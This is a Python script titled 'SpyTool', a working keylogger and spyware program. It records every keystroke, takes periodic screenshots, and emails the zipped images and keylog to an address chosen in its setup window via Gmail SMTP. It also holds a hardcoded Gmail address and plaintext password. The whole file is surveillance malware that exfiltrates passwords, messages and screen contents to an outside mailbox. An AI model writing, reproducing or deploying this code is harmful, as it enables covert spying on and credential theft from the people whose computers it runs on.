from pynput.keyboard import Key, Listener
import os
import logging
import pyscreenshot
import tkinter as tk
from datetime import datetime
import time
import math
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


#input GUI
window = tk.Tk()
window.title("SpyTool")
def click():
    global screenshot_input, email_input, email_address_input
    units1 = u1.get()
    units2 = u2.get()
    if units1 == "minutes":
        units1 = 60
    elif units1 == "seconds":
        units1 = 1
    elif units1 == "hours":
        units1 = 3600

    if units2 == "minutes":
        units2 = 60
    elif units2 == "seconds":
        units2 = 1
    elif units2 == "hours":
        units2 = 3600

    screenshot_input = e1.get()*units1
    email_input = e2.get()*units2
    email_address_input = e3.get()
    window.destroy()


tk.Label(window, text="How often do you want screenshots to be taken:").grid(row=0,column=0)
tk.Label(window, text="How often do you want emails to be sent:").grid(row=1,column=0)
tk.Label(window, text="Email adress (gmail):").grid(row=2,column=0)
e1 = tk.IntVar()
tk.Entry(window,textvariable=e1).grid(row=0,column=1)
u1 = tk.StringVar(window)
u1.set("seconds")
tk.OptionMenu(window, u1, "seconds", "minutes", "hours").grid(row=0,column=2)
e2 = tk.IntVar()
tk.Entry(window,textvariable=e2).grid(row=1,column=1)
u2 = tk.StringVar(window)
u2.set("seconds")
tk.OptionMenu(window, u2, "seconds", "minutes", "hours").grid(row=1,column=2)
e3 = tk.StringVar(window)
tk.Entry(window,textvariable=e3).grid(row=2,column=1)
tk.Button(window, text="Run", command=click).grid(row=3,column=1)
window.mainloop()

starttime = time.time()
username = os.getlogin()
directory = f"C:/Users/{username}/Documents/SpyTool"
screenshot_interval = screenshot_input
send_email_interval = email_input
i = 0
n = 0

# check if folder exists #
if not os.path.exists(directory):
    os.mkdir(directory)
img_dir_path = os.path.join(directory, "log_images")
if not os.path.exists(img_dir_path):
    os.mkdir(img_dir_path)

# logging of key presses #
logging.basicConfig(filename=f"{directory}/keylog.txt", level=logging.INFO, format="%(asctime)s: %(message)s")


def on_press(key):
    logging.info(key)


def on_release(key):
    global i
    if key == Key.f12:
        i = 2*screenshot_interval
        return False


listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# screenshots
def screenshot(time):
    image = pyscreenshot.grab()
    image.save(f"{directory}/log_images/{username}Screen{time}.png")


while i <= screenshot_interval:
    i += 1
    n += 1
    print(i, n)
    time.sleep(1 - ((time.time() - starttime) % 1))
    if i == screenshot_interval:
        now = datetime.now()
        current_time = now.strftime("%d%m%Y_%H%M%S")
        screenshot(current_time)
        i = 0
    if n == send_email_interval:
        shutil.make_archive(img_dir_path, 'zip', img_dir_path)
        benchStart = time.time()
        mail_content = '''Your data is here'''

        sender_address = 'projektmail91@gmail.com'
        sender_pass = 'SilneHeslo91'
        receiver_address = email_address_input

        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = "Log " + str(datetime.now())
        message.attach(MIMEText(mail_content, 'plain'))

        attach_file_name1 = f'{directory}/log_images.zip'
        attach_file1 = open(attach_file_name1, 'rb')
        payload1 = MIMEBase('application', 'zip', Name="log_images.zip")
        payload1.set_payload((attach_file1).read())
        encoders.encode_base64(payload1)
        payload1.add_header('Content-Decomposition', 'attachment', filename=attach_file_name1)

        attach_file_name2 = f'{directory}/keylog.txt'
        attach_file2 = open(attach_file_name2, 'rb')
        payload2 = MIMEBase('application', 'txt', Name="keylog.txt")
        payload2.set_payload((attach_file2).read())
        encoders.encode_base64(payload2)
        payload2.add_header('Content-Decomposition', 'attachment', filename=attach_file_name2)

        message.attach(payload1)
        message.attach(payload2)

        session = smtplib.SMTP('smtp.gmail.com', 587)
        session.starttls()
        session.login(sender_address, sender_pass)
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()

        shutil.rmtree(img_dir_path)
        os.mkdir(img_dir_path)
        open(directory + '/keylog.txt', 'w').close()
        benchEnd = time.time() - benchStart
        print(benchEnd)
        time.sleep(math.ceil(benchEnd) - benchEnd)
        i = (i + math.ceil(benchEnd)) % screenshot_interval
        n = i
